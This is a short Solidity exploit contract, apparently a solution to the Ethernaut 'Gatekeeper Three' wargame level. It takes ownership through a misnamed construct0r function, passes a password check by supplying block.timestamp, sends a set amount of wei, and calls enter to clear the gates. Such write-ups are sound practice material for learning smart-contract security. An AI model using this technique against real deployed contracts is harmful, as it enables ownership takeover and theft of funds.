pragma solidity 0.8.19;

interface IGatekeeperThree {
  function construct0r() external;
  function createTrick() external;
  function enter() external;
  function getAllowance(uint256) external;
}

contract Exploit {
    IGatekeeperThree target;

    constructor(address _target) {
        target = IGatekeeperThree(_target);
        target.createTrick();
    }

    function exploit() public payable {
        require(msg.value == 1000000000000001, "missing wei");

        target.construct0r();
        target.getAllowance(block.timestamp);
        target.getAllowance(block.timestamp);
        (bool sent,) = address(target).call{value: 1000000000000001}("");
        require(sent, "sent failed");

        target.enter();
    }
}
